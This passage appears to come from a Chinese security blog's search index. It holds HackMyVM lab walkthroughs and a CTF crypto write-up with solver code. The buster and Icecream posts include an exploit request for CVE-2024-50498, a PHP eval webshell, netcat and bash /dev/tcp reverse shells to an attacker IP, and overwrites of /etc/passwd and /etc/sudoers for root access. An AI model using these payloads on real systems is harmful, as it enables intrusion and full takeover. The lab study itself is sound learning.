By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://192.168.64.23/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://192.168.64.23/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11). | Found By: Rss Generator (Passive Detection) | - http://192.168.64.23/wordpress/index.php/feed/, \u003cgenerator\u003ehttps://wordpress.org/?v=6.7.2\u003c/generator\u003e | - http://192.168.64.23/wordpress/index.php/comments/feed/, \u003cgenerator\u003ehttps://wordpress.org/?v=6.7.2\u003c/generator\u003e [+] WordPress theme in use: twentytwentyfour | Location: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.3 | [!] Directory listing is enabled | Style URL: http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.64.23/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0' [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 \u003c==\u003e (10 / 10) 100.00% Time: 00:00:02 [i] User(s) Identified: [+] sancelisso | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://192.168.64.23/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] WPScan DB API OK | Plan: free | Requests Done (during the scan): 2 | Requests Remaining: 21 [+] Finished: Mon Feb 17 13:01:08 2025 [+] Requests Done: 57 [+] Cached Requests: 6 [+] Data Sent: 16.279 KB [+] Data Received: 358.677 KB [","date":"2025-02-18","objectID":"/vuln_hmv5/:1:3","tags":["渗透"],"title":"HMV VivifyTech","uri":"/vuln_hmv5/"},{"categories":["靶场"],"content":"buster ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:0","tags":["渗透"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=buster ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:1","tags":["渗透"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["靶场"],"content":"日常扫描 扫出来80端口，打开发现是wordpress wpscan扫出来两个用户，继续扫描 ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:2","tags":["渗透"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["靶场"],"content":"反弹shell wpscan –api-token –url http://192.168.64.20/ -e u,ap –plugins-detection aggressive 扫出来漏洞插件wp-query-console，CVE-2024-50498 poc POST /wp-json/wqc/v1/query HTTP/1.1 Host: kubernetes.docker.internal User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console Content-Type: application/json Content-Length: 45 Origin: http://kubernetes.docker.internal Connection: keep-alive Priority: u=0 {\"queryArgs\":\"phpinfo();\",\"queryType\":\"post\"} 改成josn格式，bp发过去 看一下被禁用的 disable_functionspassthru,exec,system,popen,chroot,scandir,chgrp,chown,escapeshpassthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh shell_exec可以试试 POST /wp-json/wqc/v1/query HTTP/1.1 Host: 192.168.64.20 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 83 {\"queryArgs\":\"shell_exec('nc -e /bin/bash 192.168.64.3 4444');\",\"queryType\":\"post\"} 本地成功拿到shell，开始提权 ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:3","tags":["渗透"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["靶场"],"content":"提权 /usr/bin/script -qc /bin/bash /dev/null交互式终端 wp-config.php看看账号密码 // ** Database settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** Database username */ define( 'DB_USER', 'll104567' ); /** Database password */ define( 'DB_PASSWORD', 'thehandsomeguy' ); /** Database hostname */ define( 'DB_HOST', 'localhost' ); 查数据库，得到密码 ta0 - $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. welcome - $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ 爆出来welcome的密码，104567，ta0的爆了好久没出来 ssh上去之后发现sudo -l发现gobuster可以sudo无密码执行，这个就是提权点 传个pspy上去看看运行的东西，发现/opt/.test.sh在后台运行，利用这个提权，但是不会（）。 看了佬的wp，有一个gobuster的通杀提权方法？ perl -e 'print crypt(\"1\",\"aa\")' cat a.py from flask import Flask, Response app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/\u003cpath:path\u003e') def catch_all(path): if len(path) == 36: return Response(status=404) else: return Response(status=200) if __name__ == '__main__': app.run(host=\"0.0.0.0\", port=80) python a.py * Serving Flask app 'a' * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:80 * Running on http://192.168.64.3:80 Press CTRL+C to quit #靶机 echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' \u003e aaa sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd cat /etc/passwd su - /aaa 然后就提权成功了 ","date":"2025-02-16","objectID":"/vuln_hmv4/:1:4","tags":["渗透"],"title":"HMV buster","uri":"/vuln_hmv4/"},{"categories":["靶场"],"content":"hmv_Icecream ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:0","tags":["渗透"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Icecream ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:1","tags":["渗透"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["靶场"],"content":"日常扫描 └─$ nmap -sV -sC -T4 -Pn -p- 192.168.64.22 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 16:05 HKT Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 60.00% done; ETC: 16:06 (0:00:07 remaining) Nmap scan report for 192.168.64.22 Host is up (0.00048s latency). Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA) |_ 256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519) 80/tcp open http nginx 1.22.1 |_http-title: 403 Forbidden |_http-server-header: nginx/1.22.1 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 9000/tcp open cslistener? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 Not Found | Server: Unit/1.33.0 | Date: Mon, 10 Feb 2025 08:05:55 GMT | Content-Type: application/json | Content-Length: 40 | Connection: close | \"error\": \"Value doesn't exist.\" | GetRequest: | HTTP/1.1 200 OK | Server: Unit/1.33.0 | Date: Mon, 10 Feb 2025 08:05:55 GMT | Content-Type: application/json | Content-Length: 1042 | Connection: close | \"certificates\": {}, | \"js_modules\": {}, | \"config\": { | \"listeners\": {}, | \"routes\": [], | \"applications\": {} | \"status\": { | \"modules\": { | \"python\": { | \"version\": \"3.11.2\", | \"lib\": \"/usr/lib/unit/modules/python3.11.unit.so\" | \"php\": { | \"version\": \"8.2.18\", | \"lib\": \"/usr/lib/unit/modules/php.unit.so\" | \"perl\": { | \"version\": \"5.36.0\", | \"lib\": \"/usr/lib/unit/modules/perl.unit.so\" | \"ruby\": { | \"version\": \"3.1.2\", | \"lib\": \"/usr/lib/unit/modules/ruby.unit.so\" | \"java\": { | \"version\": \"17.0.11\", | \"lib\": \"/usr/lib/unit/modules/java17.unit.so\" | \"wasm\": { | \"version\": \"0.1\", | \"lib\": \"/usr/lib/unit/modules/wasm.unit.so\" | HTTPOptions: | HTTP/1.1 405 Method Not Allowed | Server: Unit/1.33.0 | Date: Mon, 10 Feb 2025 08:05:55 GMT | Content-Type: application/json | Content-Length: 35 | Connection: close |_ \"error\": \"Invalid method.\" 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9000-TCP:V=7.94SVN%I=7%D=2/10%Time=67A9B363%P=aarch64-unknown-linux SF:-gnu%r(GetRequest,4A8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Unit/1\\.33\\ SF:.0\\r\\nDate:\\x20Mon,\\x2010\\x20Feb\\x202025\\x2008:05:55\\x20GMT\\r\\nContent- SF:Type:\\x20application/json\\r\\nContent-Length:\\x201042\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\n{\\r\\n\\t\\\"certificates\\\":\\x20{},\\r\\n\\t\\\"js_modules\\\":\\x20{} SF:,\\r\\n\\t\\\"config\\\":\\x20{\\r\\n\\t\\t\\\"listeners\\\":\\x20{},\\r\\n\\t\\t\\\"routes\\\": SF:\\x20\\[\\],\\r\\n\\t\\t\\\"applications\\\":\\x20{}\\r\\n\\t},\\r\\n\\r\\n\\t\\\"status\\\":\\x SF:20{\\r\\n\\t\\t\\\"modules\\\":\\x20{\\r\\n\\t\\t\\t\\\"python\\\":\\x20{\\r\\n\\t\\t\\t\\t\\\"ver SF:sion\\\":\\x20\\\"3\\.11\\.2\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib/unit/modules SF:/python3\\.11\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"php\\\":\\x20{\\r\\n\\t\\t SF:\\t\\t\\\"version\\\":\\x20\\\"8\\.2\\.18\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib/uni SF:t/modules/php\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"perl\\\":\\x20{\\r\\n\\t SF:\\t\\t\\t\\\"version\\\":\\x20\\\"5\\.36\\.0\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib/u SF:nit/modules/perl\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"ruby\\\":\\x20{\\r\\ SF:n\\t\\t\\t\\t\\\"version\\\":\\x20\\\"3\\.1\\.2\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr/lib SF:/unit/modules/ruby\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"java\\\":\\x20{\\ SF:r\\n\\t\\t\\t\\t\\\"version\\\":\\x20\\\"17\\.0\\.11\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/usr SF:/lib/unit/modules/java17\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\\t\\\"wasm\\\": SF:\\x20{\\r\\n\\t\\t\\t\\t\\\"version\\\":\\x20\\\"0\\.1\\\",\\r\\n\\t\\t\\t\\t\\\"lib\\\":\\x20\\\"/us SF:r/lib/unit/modules/wasm\\.unit\\.so\\\"\\r\\n\\t\\t\\t},\\r\\n\\r\\n\\t\\t\")%r(HTTPOpt SF:ions,C7,\"HTTP/1\\.1\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nServer:\\x20Uni SF:t/1\\.33\\.0\\r\\nDate:\\x20Mon,\\x2010\\x20Feb\\x202025\\x2008:05:55\\x20GMT\\r\\n SF:Content-Type:\\x20application/json\\r\\nContent-Length:\\x2035\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n{\\r\\n\\t\\\"error\\\":\\x20\\\"Inv","date":"2025-02-16","objectID":"/vuln_hmv3/:1:2","tags":["渗透"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["靶场"],"content":"反弹shell 看看smb服务 ┌──(kali㉿kali)-[~] └─$ smbclient -L 192.168.64.22 Password for [WORKGROUP\\kali]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers icecream Disk tmp Folder IPC$ IPC IPC Service (Samba 4.17.12-Debian) nobody Disk Home Directories Reconnecting with SMB1 for workgroup listing. smbXcli_negprot_smb1_done: No compatible protocol selected by server. Protocol negotiation to server 192.168.64.22 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE Unable to connect with SMB1 -- no workgroup available 发现用户icecream 直接往共享目录里面塞一句话木马 \u003c?php eval($_GET[cmd]);?\u003e curl一下看看效果 ┌──(kali㉿kali)-[~] └─$ curl \"http://192.168.64.22/shell.php?cmd=id\" uid=33(www-data) gid=33(www-data) groups=33(www-data) 弹shell(记得url编码一下) curl \"http://192.168.64.22/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.64.3%2F4444%200%3E%261%22\" 本地监听一下， www-data@icecream:/tmp$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin sshd:x:102:65534::/run/sshd:/usr/sbin/nologin ice:x:1000:1000:ice,,,:/home/ice:/bin/bash unit:x:999:995:unit user:/nonexistent:/bin/false 好像没有用，sudo -l也没有，思路断了，想起来nmap的时候还有其他的端口 9000端口返回 certificates {} js_modules {} config listeners {} routes [] applications {} status modules python version \"3.11.2\" lib \"/usr/lib/unit/modules/python3.11.unit.so\" php version \"8.2.18\" lib \"/usr/lib/unit/modules/php.unit.so\" perl version \"5.36.0\" lib \"/usr/lib/unit/modules/perl.unit.so\" ruby version \"3.1.2\" lib \"/usr/lib/unit/modules/ruby.unit.so\" java version \"17.0.11\" lib \"/usr/lib/unit/modules/java17.unit.so\" wasm version \"0.1\" lib \"/usr/lib/unit/modules/wasm.unit.so\" wasm-wasi-component version \"0.1\" lib \"/usr/lib/unit/modules/wasm_wasi_component.unit.so\" connections accepted 0 active 0 idle 0 closed 0 requests total 0 applications {} gpt跟我说这是NGINX Unit的输出，https://unit.nginx.org/controlapi/ 这是这个服务的官网，查后台进程，这个服务是ice的，那么就是通过这个提权到ice了 gpt直接告诉我payload了（） PUT /config/applications HTTP/1.1 Host: 192.168.64.22:9000 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept-Encoding: gzip, deflate Content-Type: application/json Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 DNT: 1 x-real-ip: Papa Content-Length: 73 { \"blogs\": { \"type\": \"php\", \"processes\": 20, \"root\": \"/tmp/shell.php\" } } 本地写一个config.json { \"listeners\": { \"*:8088\": { \"application\": \"blogs\" } }, \"applications\": { \"blogs\": { \"type\": \"php\", \"processes\": 20, \"root\": \"/tmp\" } } } 然后 curl -X PUT -d @config.json http://192.168.64.22:9000/config { \"success\": \"Reconfiguration done.\" } 然后访问8088/shell.php 并且反弹shell 这个时候就是ice了（原理我慢慢研究），现在是最喜欢的提权阶段 ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:3","tags":["渗透"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["靶场"],"content":"提权 ice@icecream:/tmp$ sudo -l sudo -l Matching Defaults entries for ice on icecream: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User ice may run the following commands on icecream: (ALL) NOPASSWD: /usr/sbin/ums2net ums2net的github页面是这样描述的 ums2net provides a way for a user to connect from a network connection to a USB mass storage device. How to use ums2net Insert the USB Mass Storage. Check /dev/disk/by-id/ for the unique path for that device. Create a config file base on the above path. Please see the config file format section. Run \"ums2net -c \". ums2net will become a daemon in the background. For debugging please add \"-d\" option to avoid detach. Use nc to write your image to the USB Mass Storage device. For example, \"nc -N localhost 29543 \u003c warp7.img\" 所以我们可以用ums2net -c来提权，首先我们要写一个配置文件，既然他可以守护进程，我们就可以利用端口去写入。 第一种方法，把root密码覆盖为无 本地 ┌──(kali㉿kali)-[~] └─$ echo \"root::0:0:root:/root:/usr/bin/bash\" \u003e tmp nc 192.168.64.22 23456 \u003c tmp 远程 ice@icecream:/tmp$ echo \"23456 of=/etc/passwd\" \u003e config echo \"23456 of=/etc/passwd\" \u003e config ice@icecream:/tmp$ sudo /usr/sbin/ums2net -c config -d sudo /usr/sbin/ums2net -c config -d /etc/sudoers:2:11: error de sintaxis with the 'visudo' command as root. ^~~~~~~~ ums2net[1282]: Totally write 35 bytes to /etc/passwd ice@icecream:/tmp$ su su id uid=0(root) gid=0(root) grupos=0(root) 方法二覆盖sudoers文件（至于为什么是这个文件，一些佬是直接用的，一些是试出来的） 我感觉主要是因为 当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限 –\u003e确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认 –\u003e若密码输入成功，则开始执行sudo后续的命令 远程 echo \"8889 of=/etc/sudoers\" \u003e config sudo /usr/sbin/ums2net -c config -d 本地 echo 'ice ALL=(ALL) NOPASSWD: ALL'|nc 192.168.64.22 8889 远程 su ","date":"2025-02-16","objectID":"/vuln_hmv3/:1:4","tags":["渗透"],"title":"HMV Icecream","uri":"/vuln_hmv3/"},{"categories":["CTF"],"content":"前言 感觉这是打的最有意思的一次比赛了，当时在火车站打开电脑写的，秒了一题，然后上火车了，一路很颠就没有再写了，复现一下前三题 ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:1:0","tags":["crypto"],"title":"2024DASCTF暑期—Crypto复现","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:0","tags":["crypto"],"title":"2024DASCTF暑期—Crypto复现","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"complex_enc task from Crypto.Util.number import * import random from secret import flag def GET_KEY(n): sum=2 key=[1] for i in range(n): r=random.randint(0,1) x=sum+random.randint(0,n)*r key.append(x) sum+=x return key def enc(m,k): cipher_list = [] for i in range(len(m)): if m[i] == 1: cipher_list.append(m[i] * k[i]) cipher = sum(cipher_list) return cipher m=bytes_to_long(flag) m = [int(bit) for byte in flag for bit in format(byte, '08b')] key=GET_KEY(len(m)) c=enc(m,key) with open('output.txt', 'w') as f: f.write(str(c)) f.write(str(key)) output 287687761937146187597379915545639385740275457170939564210821293233370716878150576 [1, 2, 87, 99, 190, 380, 760, 1702, 3350, 6712, 13302, 26669, 53257, 106512, 213212, 426262, 852583, 1705083, 3410164, 6820581, 13640909, 27281818, 54563749, 109127508, 218254958, 436509851, 873019897, 1746039768, 3492079367, 6984158992, 13968317822, 27936635563, 55873271257, 111746542368, 223493084736, 446986169472, 893972338944, 1787944677888, 3575889355776, 7151778711750, 14303557423366, 28607114846668, 57214229693336, 114428459386792, 228856918773559, 457713837547023, 915427675094046, 1830855350188252, 3661710700376344, 7323421400752912, 14646842801505675, 29293685603011275, 58587371206022773, 117174742412045483, 234349484824090806, 468698969648181659, 937397939296363271, 1874795878592726601, 3749591757185453143, 7499183514370906547, 14998367028741812852, 29996734057483625898, 59993468114967251756, 119986936229934503501, 239973872459869007099, 479947744919738013939, 959895489839476027878, 1919790979678952055983, 3839581959357904111739, 7679163918715808223719, 15358327837431616447319, 30716655674863232894717, 61433311349726465789458, 122866622699452931578804, 245733245398905863157495, 491466490797811726314990, 982932981595623452629980, 1965865963191246905260222, 3931731926382493810520182, 7863463852764987621040623, 15726927705529975242080987, 31453855411059950484161974, 62907710822119900968323970, 125815421644239801936647918, 251630843288479603873295836, 503261686576959207746591710, 1006523373153918415493183613, 2013046746307836830986367190, 4026093492615673661972734253, 8052186985231347323945468456, 16104373970462694647890936894, 32208747940925389295781874025, 64417495881850778591563748059, 128834991763701557183127495888, 257669983527403114366254991760, 515339967054806228732509983520, 1030679934109612457465019967093, 2061359868219224914930039934133, 4122719736438449829860079868450, 8245439472876899659720159736935, 16490878945753799319440319473651, 32981757891507598638880638947330, 65963515783015197277761277894728, 131927031566030394555522555789579, 263854063132060789111045111579109, 527708126264121578222090223158048, 1055416252528243156444180446316096, 2110832505056486312888360892632193, 4221665010112972625776721785264450, 8443330020225945251553443570528835, 16886660040451890503106887141057670, 33773320080903781006213774282115477, 67546640161807562012427548564230882, 135093280323615124024855097128461699, 270186560647230248049710194256923398, 540373121294460496099420388513846796, 1080746242588920992198840777027693592, 2161492485177841984397681554055387246, 4322984970355683968795363108110774528, 8645969940711367937590726216221549105, 17291939881422735875181452432443098117, 34583879762845471750362904864886196180, 69167759525690943500725809729772392360, 138335519051381887001451619459544784838, 276671038102763774002903238919089569616, 553342076205527548005806477838179139174, 1106684152411055096011612955676358278348, 2213368304822110192023225911352716556750, 4426736609644220384046451822705433113446, 8853473219288440768092903645410866226907, 17706946438576881536185807290821732453830, 35413892877153763072371614581643464907890, 70827785754307526144743229163286929815519, 141655571508615052289486458326573859631099, 283311143017230104578972916653147719262229, 566622286034460209157945833306295438524626, 1133244572068920418315891666612590877049074, 2266489144137840836631783333225181754098066, 45329782882756816732","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:1","tags":["crypto"],"title":"2024DASCTF暑期—Crypto复现","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"1z_RSA task from Crypto.Util.number import * from sympy import * import os from secrets import flag nbit =130 e = 3 l = getPrime(505) m = bytes_to_long(flag + os.urandom(64)) assert len(flag) == 29 while True: p, q = getPrime(nbit), getPrime(nbit) PQ = int(str(p\u003c\u003c120)+str(q)) QP = int(str(q\u003c\u003c120)+str(p)) if isPrime(PQ) and isPrime(QP): break n = PQ * QP PP = nextprime((PQ \u003e\u003e 190) * (QP \u0026 (2 ** 190 - 1))) QQ = nextprime((QP \u003e\u003e 190) * (PQ \u0026 (2 ** 190 - 1))) N = PP * QQ M = pow(m,1,l) c = pow(m,e,N) print('n =', n) print('M =', M) print('l =', l) print('c =', c) ''' n = 18339446336492672809908730785358232636383625709800392830207979464962269419140428722248172110017576390002616004691759163126532392634394976712779777822451878822759056304050545622761060245812934467784888422790178920804822224673755691 M = 36208281423355218604990190624029584747447986456188203264389519699277658026754156377638444926063784368328407938562964768329134840563331354924365667733322 l = 56911058350450672322326236658556745353275014753768458552003425206272938093282425278193278997347671093622024933189270932102361261551908054703317369295189 c = 720286366572443009268610917990845759123049408295363966717060100862857351750759651979922104897091176824666482923148635058966589592286465060161271579501861264957611980854954664798904862706450723639237791023808177615189976108231923 ''' 思路 当时的想法是想起来了一个很类似的题，叫做[EIS 2019]rsa1，然后发现不一样，草了， $$ n=PQ * QP =(p\\times2^{120}\\times10^{39}+q)\\times (q\\times2^{120}\\times10^{39}+p) =p \\times q \\times 2^{240} \\times 10^{39*2} +p^2 \\times 2^{120} \\times 10^{39}+q^2 \\times 2^{120} \\times 10^{39}+p \\times q $$ 所以pq低位就是 $$ n \\bmod 2^{120} \\times 10^{39} $$ 高位是 $$ \\frac{n}{2^{360} 10^{39\\times3}} $$ 因为p，q有大小误差，再除以个10左右，之后就是常见的e,phi不互素，然后crt from Crypto.Util.number import * import sympy from sympy.abc import x, y, z n = 18339446336492672809908730785358232636383625709800392830207979464962269419140428722248172110017576390002616004691759163126532392634394976712779777822451878822759056304050545622761060245812934467784888422790178920804822224673755691 M = 362082814233552186049901906240295847474479864. 56188203264389519699277658026754156377638444926063784368328407938562964768329134840563331354924365667733322 l = 56911058350450672322326236658556745353275014753768458552003425206272938093282425278193278997347671093622024933189270932102361261551908054703317369295189 c = 720286366572443009268610917990845759123049408295363966717060100862857351750759651979922104897091176824666482923148635058966589592286465060161271579501861264957611980854954664798904862706450723639237791023808177615189976108231923 p_q_l = n % (2**120 * 10**39) p_q_h = n // (2**360 * 10 ** (39 * 3)) // 10 pq = p_q_h * (2**120 * 10**39) + p_q_l a = sympy.solve( [x * y - pq, (x * 2**120 * 10**40 + y) * (y * 2**120 * 10**39 + x) - n], [x, y] ) p, q = a[1] print(p) print(q) #sage from Crypto.Util.number import * p=855604426214387476576649090490109822073 q=1213149261930568621267125437333569321667 PQ = int(str(p\u003c\u003c120)+str(q)) QP = int(str(q\u003c\u003c120)+str(p)) PP = next_prime((PQ \u003e\u003e 190) * (QP \u0026 (2**190 - 1))) QQ = next_prime((QP \u003e\u003e 190) * (PQ \u0026 (2**190 - 1))) for mp in GF(PP)(c).nth_root(3, all=True): for mq in GF(QQ)(c).nth_root(3, all=True): m = crt([ZZ(mp), ZZ(mq)], [PP, QQ]) mm = crt([m,M],[PP*QQ,l]) print(long_to_bytes(int(mm))) #b'DASCTF{Ar3_Y0u_Su93_Abt139??}' ","date":"2024-12-12","objectID":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/:2:2","tags":["crypto"],"title":"2024DASCTF暑期—Crypto复现","uri":"/2024dasctf%E6%9A%91%E6%9C%9Fcrypto%E5%A4%8D%E7%8E%B0/"},{"categories":["CTF"],"content":"found task from Crypto.Util.number import * from random import * from secret import flag from sympy import * bits = 1024 l = 138833858362699289505402947409766595473722379891580589518174731439613184249727659678966809301611194545239974736175752769503863392697421092435438747741790652435801956708356186578269272819715592752821497122516109657809748674185639254430403157877064556216401002688452227124543508128414591884297632663910714681207 assert isPrime(l) def generate_prime(bits): return randprime(2**(bits-1), 2**bits) def fun(data,y,n): return sum([data[i] * pow(y,i,n) for i in range(len(data))]) % n def gen(x, y, z, w, n): data = [randint(n // 4, n) for _ in range(10)] leak1 = pow(x + pow(y, z, n), w, n) leak2 = fun(data, y, n) return data, leak1, leak2 def encrypt(l,m,n): mm = bin(m)[2:].zfill((m.bit_length() // 8 + 1) * 8) length = len(mm) c = [] s = [] for i in range(length): a = randint(1, n) s.append(pow(a, length, n)) for j in range(length): c.append(pow(l,int(mm[j]),n) * s[j] % n) return c p, q = [generate_prime(bits) for _ in range(2)] r = generate_prime(bits // 4) n = p ** 2 * q * r e1 = generate_prime(128) e2 = generate_prime(128) phi1 = p * (p - 1) * (q - 1) * (r - 1) phi2 = (p - 1) * (p - 2) * (q - 2) * (r - 2) d1 = inverse(e1, phi1) d2 = inverse(e2, phi2) t = getRandomRange(n // 4, n) data, leak1, leak2 = gen(r, t, e1, d1, n) m = bytes_to_long(flag) c = encrypt(l, m, n) with open('output.txt','w') as f: f.write(f'n = {n}\\n') f.write(f'e1 = {e1}\\n') f.write(f'ed = {e2 * d2}\\n') f.write(f'data = {data}\\n') f.write(f'leak1 = {leak1}\\n') f.write(f'leak2 = {leak2}\\n') 